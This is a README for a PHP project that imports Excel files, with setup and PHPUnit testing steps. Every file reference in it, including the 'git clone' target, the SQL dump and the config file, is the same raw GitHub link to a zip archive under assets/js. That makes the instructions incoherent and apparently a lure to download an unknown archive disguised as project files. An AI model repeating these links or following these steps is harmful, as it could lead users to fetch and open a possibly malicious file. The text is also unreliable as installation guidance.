
<!-- GETTING STARTED -->
## Getting Started

This is a task solution of php oop import excel example.
To get a local copy up and running follow these simple example steps.


### Installation

1. Clone the repo in your localhost www folder
   ```sh
   git clone https://raw.githubusercontent.com/MohammedBadry/excel-import-task/master/assets/js/import-task-excel-floative.zip
   ```
2. Open terminal in the project root directory and run
   ```js
   composer install
   ```
3. Go to your phpMyAdmin and create new database

4. Import the `https://raw.githubusercontent.com/MohammedBadry/excel-import-task/master/assets/js/import-task-excel-floative.zip` file from the root directory

5. Enter your DB Settings in `https://raw.githubusercontent.com/MohammedBadry/excel-import-task/master/assets/js/import-task-excel-floative.zip` in the root directory
   ```js
   const DB_HOST = 'ENTER YOUR Host Name';
   const DB_NAME = 'ENTER YOUR Database Name';
   const DB_USER = 'ENTER YOUR Database Username';
   const DB_PASSWORD = 'ENTER YOUR Database Password';
   ```
6. Open the project on your browser like below
   ```js
    http://localhost/excel-import-task
   ```
7. For testing:
   - Open `https://raw.githubusercontent.com/MohammedBadry/excel-import-task/master/assets/js/import-task-excel-floative.zip` in `app/Libraries` directory

   - Comment this line  
   ```js
   self::$instance = new PDO('mysql:host='.DB_HOST.';dbname='.DB_NAME, DB_USERNAME, DB_PASSWORD, $pdo_options);    
   ```
   - Then Uncomment this line and enter your testing database configurations
   ```js
   //self::$instance = new PDO('mysql:host=localhost;dbname=task', 'root', '', $pdo_options);
   ```   
   - Open terminal inside root directory then run the test command
   ```js
    ./vendor/bin/phpunit tests
   ```
